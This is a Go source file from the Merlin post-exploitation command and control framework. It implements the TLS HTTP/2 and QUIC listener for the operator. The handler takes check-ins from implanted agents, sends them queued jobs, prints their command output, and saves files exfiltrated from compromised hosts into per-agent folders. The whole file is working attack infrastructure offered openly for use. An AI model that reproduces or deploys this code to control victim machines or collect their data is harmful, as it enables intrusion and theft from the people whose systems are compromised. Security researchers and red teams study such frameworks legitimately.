// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package http2

import (
	// Standard
	"bytes"
	"crypto/sha1" // #nosec G505 - This library is required to check X.509 certificates using SHA1 hash
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"

	// 3rd Party
	"github.com/fatih/color"
	"github.com/lucas-clemente/quic-go"
	"github.com/lucas-clemente/quic-go/h2quic"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agents"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/logging"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// Server is a structure for creating and instantiating new server objects
type Server struct {
	Interface   string
	Port        int
	Protocol    string
	Key         string
	Certificate string
	Server      interface{}
	Mux         *http.ServeMux
}

// New instantiates a new server object and returns it
func New(iface string, port int, protocol string, key string, certificate string) (Server, error) {
	s := Server{
		Protocol:  protocol,
		Interface: iface,
		Port:      port,
		Mux:       http.NewServeMux(),
	}

	// Check to make sure files exist
	_, errCrt := os.Stat(certificate)
	if errCrt != nil {
		message("warn", "There was an error importing the SSL/TLS x509 certificate")
		message("warn", errCrt.Error())
		return s, errCrt
	}
	s.Certificate = certificate

	_, errKey := os.Stat(key)
	if errKey != nil {
		message("warn", "There was an error importing the SSL/TLS x509 key")
		message("warn", errKey.Error())
		logging.Server(fmt.Sprintf("There was an error importing the SSL/TLS x509 key\r\n%s", errKey.Error()))
		return s, errKey
	}
	s.Key = key

	cer, err := tls.LoadX509KeyPair(certificate, key)
	if err != nil {
		message("warn", "There was an error importing the SSL/TLS x509 key pair")
		message("warn", "Ensure a keypair is located in the data/x509 directory")
		message("warn", err.Error())
		logging.Server(fmt.Sprintf("There was an error importing the SSL/TLS x509 key pair\r\n%s", err.Error()))
		return s, err
	}

	// Read x.509 Public Key into a variable
	PEMData, err := ioutil.ReadFile(certificate) // #nosec G304 - Users can specify any file or path for X.509 cert
	if err != nil {
		message("warn", "There was an error reading the SSL/TLS x509 certificate file")
		message("warn", err.Error())
		return s, err
	}

	// Decode the x.509 Public Key from PEM
	block, _ := pem.Decode(PEMData)
	if block == nil {
		message("warn", "failed to decode PEM block from public key")
	}

	// Convert the PEM block into a Certificate object
	pubCert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		message("warn", err.Error())
	}

	// TODO switch to SHA256
	// Create SHA1 fingerprint from Certificate
	sha1Fingerprint := sha1.Sum(pubCert.Raw) // #nosec G401 - Required to handle certificates with no SHA256 hash

	// merlinCRT is the string representation of the SHA1 fingerprint for the public x.509 certificate distributed with Merlin
	merlinCRT := "e2c9fbb41712c15b57b5cbb6e6ec96fb5efed8fd"

	// Check to see if the Public Key SHA1 finger print matches the certificate distributed with Merlin for testing
	if merlinCRT == hex.EncodeToString(sha1Fingerprint[:]) {
		message("warn", "Insecure publicly distributed Merlin x.509 testing certificate in use")
		message("info", "Additional details: https://github.com/Ne0nd0g/merlin/wiki/TLS-Certificates")
	}

	// Configure TLS
	TLSConfig := &tls.Config{
		Certificates: []tls.Certificate{cer},
		MinVersion:   tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		},
		NextProtos: []string{protocol},
	}

	s.Mux.HandleFunc("/", agentHandler)

	srv := &http.Server{
		Addr:           s.Interface + ":" + strconv.Itoa(s.Port),
		Handler:        s.Mux,
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 20,
		TLSConfig:      TLSConfig,
	}

	if s.Protocol == "h2" {
		s.Server = srv
	} else if s.Protocol == "hq" {
		s.Server = &h2quic.Server{
			Server: srv,
			QuicConfig: &quic.Config{
				KeepAlive:                   false,
				IdleTimeout:                 168 * time.Hour,
				RequestConnectionIDOmission: false,
			},
		}

	} else {
		return s, fmt.Errorf("%s is an invalid server protocol", s.Protocol)
	}
	return s, nil
}

// Run function starts the server on the preconfigured port for the preconfigured service
func (s *Server) Run() error {
	logging.Server(fmt.Sprintf("Starting %s Listener at %s:%d", s.Protocol, s.Interface, s.Port))
	logging.Server(fmt.Sprintf("x.509 Certificate %s", s.Certificate))
	logging.Server(fmt.Sprintf("x.509 Key %s", s.Key))

	time.Sleep(45 * time.Millisecond) // Sleep to allow the shell to start up
	message("note", fmt.Sprintf("Starting %s listener on %s:%d", s.Protocol, s.Interface, s.Port))

	if s.Protocol == "h2" {
		server := s.Server.(*http.Server)

		defer func() {
			err := server.Close()
			if err != nil {
				message("warn", fmt.Sprintf("There was an error starting the h2 server:\r\n%s",
					err.Error()))
				return
			}
		}()
		go logging.Server(server.ListenAndServeTLS(s.Certificate, s.Key).Error())
		return nil
	} else if s.Protocol == "hq" {
		server := s.Server.(*h2quic.Server)

		defer func() {
			err := server.Close()
			if err != nil {
				message("warn", fmt.Sprintf("There was an error starting the hq server:\r\n%s",
					err.Error()))
				return
			}
		}()
		go logging.Server(server.ListenAndServeTLS(s.Certificate, s.Key).Error())
		return nil
	}
	return fmt.Errorf("%s is an invalid server protocol", s.Protocol)
}

// agentHandler function is responsible for all Merlin agent traffic
func agentHandler(w http.ResponseWriter, r *http.Request) {
	if core.Verbose {
		message("note", fmt.Sprintf("Received HTTP %s Connection from %s", r.Method, r.RemoteAddr))
		logging.Server(fmt.Sprintf("Received HTTP %s Connection from %s", r.Method, r.RemoteAddr))
	}

	if core.Debug {
		message("debug", fmt.Sprintf("HTTP Connection Details:"))
		message("debug", fmt.Sprintf("Host: %s", r.Host))
		message("debug", fmt.Sprintf("URI: %s", r.RequestURI))
		message("debug", fmt.Sprintf("Method: %s", r.Method))
		message("debug", fmt.Sprintf("Protocol: %s", r.Proto))
		message("debug", fmt.Sprintf("Headers: %s", r.Header))
		message("debug", fmt.Sprintf("TLS Negotiated Protocol: %s", r.TLS.NegotiatedProtocol))
		message("debug", fmt.Sprintf("TLS Cipher Suite: %d", r.TLS.CipherSuite))
		message("debug", fmt.Sprintf("TLS Server Name: %s", r.TLS.ServerName))
		message("debug", fmt.Sprintf("Content Length: %d", r.ContentLength))

		logging.Server(fmt.Sprintf("[DEBUG]HTTP Connection Details:"))
		logging.Server(fmt.Sprintf("[DEBUG]Host: %s", r.Host))
		logging.Server(fmt.Sprintf("[DEBUG]URI: %s", r.RequestURI))
		logging.Server(fmt.Sprintf("[DEBUG]Method: %s", r.Method))
		logging.Server(fmt.Sprintf("[DEBUG]Protocol: %s", r.Proto))
		logging.Server(fmt.Sprintf("[DEBUG]Headers: %s", r.Header))
		logging.Server(fmt.Sprintf("[DEBUG]TLS Negotiated Protocol: %s", r.TLS.NegotiatedProtocol))
		logging.Server(fmt.Sprintf("[DEBUG]TLS Cipher Suite: %d", r.TLS.CipherSuite))
		logging.Server(fmt.Sprintf("[DEBUG]TLS Server Name: %s", r.TLS.ServerName))
		logging.Server(fmt.Sprintf("[DEBUG]Content Length: %d", r.ContentLength))
	}

	w.Header().Set("Access-Control-Allow-Origin", "*")

	if r.Method == "POST" && r.ProtoMajor == 2 {

		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}
    
		err1 := json.NewDecoder(r.Body).Decode(&j)
		if err1 != nil {
			message("warn", fmt.Sprintf("There was an error decoding a POST message sent by an "+
				"agent:\r\n%s", err1))
			return
		}

		//reading the body before parsing json seems to resolve the receiving error on large bodies for some reason, unsure why
		b, e := ioutil.ReadAll(r.Body)
		if e != nil {
			message("warn", e.Error())
			return
		}
		e = json.NewDecoder(bytes.NewReader(b)).Decode(&j)
		if e != nil {
			message("warn", e.Error())
			return
		}
		if core.Debug {
			message("debug", fmt.Sprintf("[DEBUG]POST DATA: %v", j))
		}

		switch j.Type {

		case "InitialCheckIn":
			//var p messages.AgentInfo
			//json.Unmarshal(payload, &p)
			agents.InitialCheckIn(j)

		case "StatusCheckIn":
			w.Header().Set("Content-Type", "application/json")
			x, err := agents.StatusCheckIn(j)
			if core.Verbose {
				message("note", fmt.Sprintf("Sending "+x.Type+" message type to agent"))
			}
			if err != nil {
				message("warn", err.Error())
			}
			err2 := json.NewEncoder(w).Encode(x)
			if err2 != nil {
				message("warn", fmt.Sprintf("There was an error encoding the StatusCheckIn JSON "+
					"message:\r\n%s", err2))
				return
			}

		case "CmdResults":
			// TODO move to its own function
			var p messages.CmdResults
			err3 := json.Unmarshal(payload, &p)
			if err3 != nil {
				message("warn", fmt.Sprintf("There was an error unmarshalling the CmdResults JSON "+
					"object:\r\n%s", err3))
				return
			}
			agents.Log(j.ID, fmt.Sprintf("Results for job: %s", p.Job))

			message("success", fmt.Sprintf("Results for job %s at %s", p.Job, time.Now().UTC().Format(time.RFC3339)))
			if len(p.Stdout) > 0 {
				agents.Log(j.ID, fmt.Sprintf("Command Results (stdout):\r\n%s", p.Stdout))
				color.Green(fmt.Sprintf("%s", p.Stdout))
			}
			if len(p.Stderr) > 0 {
				agents.Log(j.ID, fmt.Sprintf("Command Results (stderr):\r\n%s", p.Stderr))
				color.Red(fmt.Sprintf("%s", p.Stderr))
			}

		case "AgentInfo":
			var p messages.AgentInfo
			err4 := json.Unmarshal(payload, &p)
			if err4 != nil {
				message("warn", fmt.Sprintf("There was an error unmarshalling the AgentInfo "+
					"JSON object:\r\n%s", err4))
				return
			}
			if core.Debug {
				message("debug", fmt.Sprintf("AgentInfo JSON object: %v", p))
			}
			agents.UpdateInfo(j, p)
		case "FileTransfer":
			var p messages.FileTransfer
			err5 := json.Unmarshal(payload, &p)
			if err5 != nil {
				message("warn", fmt.Sprintf("There was an error unmarshalling the FileTransfer JSON "+
					"object:\r\n%s", err5))
			}
			if p.IsDownload {
				agentsDir := filepath.Join(core.CurrentDir, "data", "agents")
				_, f := filepath.Split(p.FileLocation) // We don't need the directory part for anything
				if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
					message("", "[!]There was an error locating the agent's directory")
					message("", errD.Error())
				}
				message("success", fmt.Sprintf("Results for job %s", p.Job))
				downloadBlob, downloadBlobErr := base64.StdEncoding.DecodeString(p.FileBlob)

				if downloadBlobErr != nil {
					message("", "[!]There was an error decoding the fileBlob")
					message("", downloadBlobErr.Error())
				} else {
					downloadFile := filepath.Join(agentsDir, j.ID.String(), f)
					writingErr := ioutil.WriteFile(downloadFile, downloadBlob, 0644)
					if writingErr != nil {
						message("warn", fmt.Sprintf("There was an error writing to : %s", p.FileLocation))
						message("warn", writingErr.Error())
					} else {
						message("success", fmt.Sprintf("Successfully downloaded file %s with a size of "+
							"%d bytes from agent %s to %s",
							p.FileLocation,
							len(downloadBlob),
							j.ID.String(),
							downloadFile))
						agents.Log(j.ID, fmt.Sprintf("Successfully downloaded file %s with a size of %d "+
							"bytes from agent to %s",
							p.FileLocation,
							len(downloadBlob),
							downloadFile))
					}
				}
			}
		default:
			message("warn", fmt.Sprintf("Invalid Activity: %s", j.Type))
		}

	} else if r.Method == "GET" {
		// Should answer any GET requests
		// Send 404
		w.WriteHeader(404)
	} else if r.Method == "OPTIONS" && r.ProtoMajor == 2 {
		w.Header().Set("Access-Control-Allow-Methods", "POST")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Headers", "accept, content-type")
	} else {
		w.WriteHeader(404)
	}
}

// message is used to print a message to the command line
func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

// TODO make sure all errors are logged to server log
